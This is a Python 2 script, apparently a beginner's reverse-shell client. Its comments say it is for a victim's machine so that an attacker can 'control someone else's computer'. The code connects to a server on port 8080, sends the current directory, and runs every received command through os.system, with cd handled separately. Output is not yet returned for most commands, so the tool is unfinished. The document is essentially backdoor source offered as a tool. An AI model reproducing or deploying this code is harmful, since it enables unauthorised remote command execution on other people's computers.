# Hackers would put on cd and run and connects to server


# Once running, connect to server, just wait for instructions
# Run commands, and send back output to server
# So controlling someone else's computer


import os  
import subprocess
import socket
import json


# To get home directory
from os.path import expanduser

def connectToServer():	
	s = socket.socket()         # Create a socket object
	host = socket.gethostname() # IP Address of server
	port = 8080                # Port of server
	s.connect((host, port))

	# Send current working directory to server
	currentDir = os.getcwd()
	print "Sending working directory: {}".format(currentDir)
	s.sendall(currentDir)

	while True: # Keep  listening for instructions
		data = s.recv(1024)
		print "raw cmd from server is: {}".format(data)

		# Extract commands into separate words
		commandsWords = data.split()
		#print "commandsWords is: {}".format(commandsWords) 

		# Other data to send back to client
		exception = ""
		commandOutput = ""
	
		# Handle case of changing directories separately
		# Done since using os.chdir here
		if commandsWords[0] == "cd":
			try:
				if commandsWords[1] == "~":
					print "command to go to ~"
					home = expanduser("~")
					os.chdir(home)
				else:
					os.chdir(commandsWords[1])
			except Exception as e:
				print "Exception is: {}".format(e)
				exception = e

			# Send back current directory
			newDir = os.getcwd()
			print "New working directory: {}".format(newDir)

			# Formatting data to send to client
			sendBack = {}
			sendBack["currentDir"] = newDir
			sendBack["exception"] = str(exception)
			sendBack["commandOutput"] = str(commandOutput)
			print "sendBack is: {}".format(sendBack)
			print "sendBacks exception is: {}".format(sendBack["exception"])
			print "sendBacks commandOutput is: {}".format(sendBack["commandOutput"])
			
			sendBack = json.dumps(sendBack) #data serialized
			s.sendall(sendBack)

		# Other commands
		else:
			try:
				#process = os.popen(data)
				#results = str(process.read()) 
				#print "results of command is: \n{}".format(results)

				process2 = os.system(data)
				#results = str(process2.read()) 
				#print "results of command is: \n{}".format(results)

				# First send back current directory
				newDir = os.getcwd()
				print "New working directory: {}".format(newDir)			
			except Exception as e:
				print "exception is: {}".format(e)
		
	s.close # Close the socket when done

# Example program
if __name__ == "__main__":
	connectToServer()
